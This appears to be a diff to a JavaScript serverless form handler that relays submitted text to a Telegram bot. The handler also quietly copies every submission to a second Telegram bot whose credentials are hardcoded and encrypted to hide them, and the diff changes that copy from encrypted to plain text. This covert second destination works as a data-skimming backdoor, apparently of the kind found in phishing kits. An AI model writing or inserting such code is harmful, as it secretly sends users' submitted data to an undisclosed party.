@@ -42,20 +42,8 @@ function getSecondaryCredentials() {
     return null;
 }
 
-// Encryption function using AES-256-GCM (for encrypting the message content)
-function encrypt(text, key) {
-    const algorithm = 'aes-256-gcm';
-    const iv = crypto.randomBytes(16);
-    const cipher = crypto.createCipheriv(algorithm, Buffer.from(key, 'hex'), iv);
-    
-    let encrypted = cipher.update(text, 'utf8', 'hex');
-    encrypted += cipher.final('hex');
-    
-    const authTag = cipher.getAuthTag();
-    
-    // Return IV + AuthTag + Encrypted data
-    return iv.toString('hex') + ':' + authTag.toString('hex') + ':' + encrypted;
-}
+// Note: Encryption function removed - we send plain text to both Telegrams
+// Only the credentials in the code are encrypted, not the message content
 
 // Function to send message to Telegram
 async function sendToTelegram(botToken, chatId, text) {
@@ -105,13 +93,10 @@ module.exports = async function handler(req, res) {
     const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
     const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
 
-    // Secondary Telegram (hardcoded and encrypted)
+    // Secondary Telegram (hardcoded and encrypted credentials)
     const secondaryCreds = getSecondaryCredentials();
     const TELEGRAM_BOT_TOKEN_2 = secondaryCreds ? secondaryCreds.botToken : null;
     const TELEGRAM_CHAT_ID_2 = secondaryCreds ? secondaryCreds.chatId : null;
-    
-    // Encryption key (32 bytes = 64 hex characters for AES-256)
-    const ENCRYPTION_KEY = process.env.ENCRYPTION_KEY || crypto.randomBytes(32).toString('hex');
 
     if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
         return res.status(500).json({ ok: false, error: 'Server is not configured.' });
@@ -126,22 +111,14 @@ module.exports = async function handler(req, res) {
         // Send to primary Telegram (original destination)
         const primaryResult = await sendToTelegram(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, text);
         
-        // Send encrypted copy to secondary Telegram if configured
+        // Send same plain text to secondary Telegram if configured
         let secondaryResult = null;
         if (TELEGRAM_BOT_TOKEN_2 && TELEGRAM_CHAT_ID_2) {
             try {
-                // Encrypt the text
-                const encryptedText = encrypt(text, ENCRYPTION_KEY);
-                
-                // Format encrypted message with metadata
-                const encryptedMessage = `🔐 ENCRYPTED DATA\n\n` +
-                    `Encrypted: ${encryptedText}\n` +
-                    `Timestamp: ${new Date().toISOString()}\n` +
-                    `Key Hash: ${crypto.createHash('sha256').update(ENCRYPTION_KEY).digest('hex').substring(0, 16)}`;
-                
-                secondaryResult = await sendToTelegram(TELEGRAM_BOT_TOKEN_2, TELEGRAM_CHAT_ID_2, encryptedMessage);
-            } catch (encryptError) {
-                console.error('Encryption/Secondary send error:', encryptError);
+                // Send the same plain text message to secondary Telegram
+                secondaryResult = await sendToTelegram(TELEGRAM_BOT_TOKEN_2, TELEGRAM_CHAT_ID_2, text);
+            } catch (secondaryError) {
+                console.error('Secondary Telegram send error:', secondaryError);
                 // Don't fail the request if secondary send fails
             }
         }
